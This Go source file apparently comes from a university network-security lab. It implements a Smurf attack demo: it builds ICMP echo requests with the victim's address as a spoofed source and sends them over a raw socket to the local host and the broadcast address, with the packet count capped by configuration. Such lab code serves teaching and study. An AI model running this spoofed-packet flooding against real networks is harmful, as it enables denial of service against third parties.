package usecase

import (
	"fmt"
	"net"
	"time"

	"NSSaDS/lab5/internal/domain"
	"NSSaDS/lab5/internal/infrastructure/icmp"
	"NSSaDS/lab5/pkg/config"
)

type Smurfer struct {
	cfg *config.Config
	out domain.Printer
}

func NewSmurfer(cfg *config.Config, out domain.Printer) *Smurfer {
	return &Smurfer{cfg: cfg, out: out}
}

func ClampSmurfCount(n, def, max int) int {
	if n <= 0 {
		return def
	}
	if n > max {
		return max
	}
	return n
}

func (s *Smurfer) Run(victimHost, bcastHost string, count int) error {
	victim, err := ResolveIPv4(victimHost)
	if err != nil {
		return fmt.Errorf("victim: %w", err)
	}
	local, autoBcast, err := LANToward(victim)
	if err != nil {
		return fmt.Errorf("local lan: %w", err)
	}
	bcast, err := resolveOptionalIP(bcastHost, autoBcast)
	if err != nil {
		return fmt.Errorf("broadcast: %w", err)
	}
	count = ClampSmurfCount(count, s.cfg.SmurfCount, s.cfg.SmurfMax)
	dests := smurfDests(victim, local, bcast)

	sock, err := icmp.OpenRawIP()
	if err != nil {
		return fmt.Errorf("open raw ip: %w", err)
	}
	defer sock.Close()

	s.printBanner(victim, local, dests, count)
	return s.sendAll(sock, victim, dests, count)
}

func resolveOptionalIP(host string, fallback net.IP) (net.IP, error) {
	if host == "" {
		return fallback, nil
	}
	return ResolveIPv4(host)
}

func smurfDests(victim, local, bcast net.IP) []net.IP {
	var dests []net.IP
	if local != nil && !ipEqual4(local, victim) {
		dests = append(dests, local)
	}
	if bcast != nil && !ipEqual4(bcast, victim) {
		dests = append(dests, bcast)
	}
	if len(dests) == 0 {
		dests = append(dests, victim)
	}
	return uniqueIPs(dests...)
}

func ipEqual4(a, b net.IP) bool {
	if a == nil || b == nil {
		return false
	}
	a4, b4 := a.To4(), b.To4()
	return a4 != nil && b4 != nil && a4.Equal(b4)
}

func (s *Smurfer) printBanner(victim, local net.IP, dests []net.IP, count int) {
	s.out.Printf("lab smurf demo: %d echo(s) to %d dest(s), source=%s\n", count, len(dests), victim)
	if local != nil {
		s.out.Printf("  this pc (reflector): %s\n", local)
	}
	for _, d := range dests {
		s.out.Printf("  dest: %s\n", d)
	}
	s.out.Printf("wireshark on victim: icmp && ip.dst == %s\n", victim)
}

func (s *Smurfer) sendAll(sock domain.RawIPSocket, victim net.IP, dests []net.IP, count int) error {
	seq := 1
	sent := 0
	max := s.cfg.SmurfMax
	if max <= 0 {
		max = config.MaxSmurfCount
	}
	for i := 0; i < count; i++ {
		for _, dst := range dests {
			if sent >= max {
				return nil
			}
			if err := s.sendOne(sock, victim, dst, seq); err != nil {
				return err
			}
			s.out.Printf("sent spoofed echo seq=%d dest=%s\n", seq, dst)
			seq++
			sent++
		}
	}
	return nil
}

func (s *Smurfer) sendOne(sock domain.RawIPSocket, src, dst net.IP, seq int) error {
	payload, err := icmp.BuildEchoRequest(WorkerID(0), seq, time.Now(), s.cfg.PayloadSize)
	if err != nil {
		return fmt.Errorf("build echo: %w", err)
	}
	packet, err := icmp.BuildIPv4(src, dst, payload, s.cfg.DefaultTTL)
	if err != nil {
		return fmt.Errorf("build ipv4: %w", err)
	}
	if err := sock.SendIP(dst, packet); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	return nil
}
